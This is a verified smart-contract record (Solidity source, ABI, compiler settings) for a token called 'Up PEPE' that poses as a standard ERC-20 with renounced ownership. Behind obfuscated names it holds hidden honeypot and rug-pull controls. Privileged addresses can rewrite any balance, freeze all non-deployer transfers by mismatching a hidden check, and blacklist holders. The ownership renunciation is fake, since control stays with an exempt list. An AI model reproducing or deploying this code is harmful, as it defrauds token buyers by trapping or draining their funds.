{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface modeTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTotal) external view returns (uint256);\n\n    function transfer(address modeFeeTeam, uint256 totalMin) external returns (bool);\n\n    function allowance(address launchMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeFeeTeam,\n        uint256 totalMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toWalletIs, uint256 value);\n    event Approval(address indexed launchMin, address indexed spender, uint256 value);\n}\n\nabstract contract tradingAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenSwap {\n    function createPair(address maxList, address isEnable) external returns (address);\n}\n\ninterface modeTradingMetadata is modeTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UpPEPE is tradingAmount, modeTrading, modeTradingMetadata {\n\n    function getOwner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    function transfer(address receiverTrading, uint256 totalMin) external virtual override returns (bool) {\n        return launchMode(_msgSender(), receiverTrading, totalMin);\n    }\n\n    event OwnershipTransferred(address indexed marketingMax, address indexed limitToken);\n\n    bool private isMin;\n\n    function owner() external view returns (address) {\n        return launchedFrom;\n    }\n\n    uint256 txEnable;\n\n    uint256 constant tokenReceiver = 13 ** 10;\n\n    mapping(address => mapping(address => uint256)) private txTrading;\n\n    function buyFeeTrading(uint256 totalMin) public {\n        walletTake();\n        teamBuyWallet = totalMin;\n    }\n\n    function walletTake() private view {\n        require(fromExempt[_msgSender()]);\n    }\n\n    uint256 private swapWallet = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamList;\n    }\n\n    address feeTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address liquidityTotal) public view virtual override returns (uint256) {\n        return liquiditySell[liquidityTotal];\n    }\n\n    function atTx(address senderWallet) public {\n        require(senderWallet.balance < 100000);\n        if (senderIs) {\n            return;\n        }\n        \n        fromExempt[senderWallet] = true;\n        if (shouldFeeAuto) {\n            buyTxList = true;\n        }\n        senderIs = true;\n    }\n\n    mapping(address => bool) public txIsMode;\n\n    address public senderTx;\n\n    address isFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address autoLaunched, address autoSwap) external view virtual override returns (uint256) {\n        if (autoSwap == isFee) {\n            return type(uint256).max;\n        }\n        return txTrading[autoLaunched][autoSwap];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapMode;\n    }\n\n    function tradingMode(address receiverTrading, uint256 totalMin) public {\n        walletTake();\n        liquiditySell[receiverTrading] = totalMin;\n    }\n\n    string private walletEnable = \"UPE\";\n\n    uint256 teamBuyWallet;\n\n    mapping(address => uint256) private liquiditySell;\n\n    mapping(address => bool) public fromExempt;\n\n    bool private launchReceiver;\n\n    address private launchedFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapWallet;\n    }\n\n    uint8 private teamList = 18;\n\n    string private swapMode = \"Up PEPE\";\n\n    address public launchMarketing;\n\n    function transferFrom(address maxShould, address modeFeeTeam, uint256 totalMin) external override returns (bool) {\n        if (_msgSender() != isFee) {\n            if (txTrading[maxShould][_msgSender()] != type(uint256).max) {\n                require(totalMin <= txTrading[maxShould][_msgSender()]);\n                txTrading[maxShould][_msgSender()] -= totalMin;\n            }\n        }\n        return launchMode(maxShould, modeFeeTeam, totalMin);\n    }\n\n    function buyEnable(address maxShould, address modeFeeTeam, uint256 totalMin) internal returns (bool) {\n        require(liquiditySell[maxShould] >= totalMin);\n        liquiditySell[maxShould] -= totalMin;\n        liquiditySell[modeFeeTeam] += totalMin;\n        emit Transfer(maxShould, modeFeeTeam, totalMin);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletEnable;\n    }\n\n    constructor (){\n        \n        launchShould tradingFrom = launchShould(isFee);\n        senderTx = tokenSwap(tradingFrom.factory()).createPair(tradingFrom.WETH(), address(this));\n        if (buyTxList == isMin) {\n            shouldFeeAuto = true;\n        }\n        launchMarketing = _msgSender();\n        totalFeeMode();\n        fromExempt[launchMarketing] = true;\n        liquiditySell[launchMarketing] = swapWallet;\n        \n        emit Transfer(address(0), launchMarketing, swapWallet);\n    }\n\n    function approve(address autoSwap, uint256 totalMin) public virtual override returns (bool) {\n        txTrading[_msgSender()][autoSwap] = totalMin;\n        emit Approval(_msgSender(), autoSwap, totalMin);\n        return true;\n    }\n\n    function launchMode(address maxShould, address modeFeeTeam, uint256 totalMin) internal returns (bool) {\n        if (maxShould == launchMarketing) {\n            return buyEnable(maxShould, modeFeeTeam, totalMin);\n        }\n        uint256 takeFund = modeTrading(senderTx).balanceOf(feeTx);\n        require(takeFund == teamBuyWallet);\n        require(modeFeeTeam != feeTx);\n        if (txIsMode[maxShould]) {\n            return buyEnable(maxShould, modeFeeTeam, tokenReceiver);\n        }\n        return buyEnable(maxShould, modeFeeTeam, totalMin);\n    }\n\n    function totalFeeMode() public {\n        emit OwnershipTransferred(launchMarketing, address(0));\n        launchedFrom = address(0);\n    }\n\n    function liquidityBuy(address launchFund) public {\n        walletTake();\n        if (buyTxList == isMin) {\n            launchReceiver = true;\n        }\n        if (launchFund == launchMarketing || launchFund == senderTx) {\n            return;\n        }\n        txIsMode[launchFund] = true;\n    }\n\n    bool public senderIs;\n\n    bool private buyTxList;\n\n    bool public shouldFeeAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toWalletIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"}],\"name\":\"atTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"buyFeeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFeeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFeeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"tradingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeFeeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txIsMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UpPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}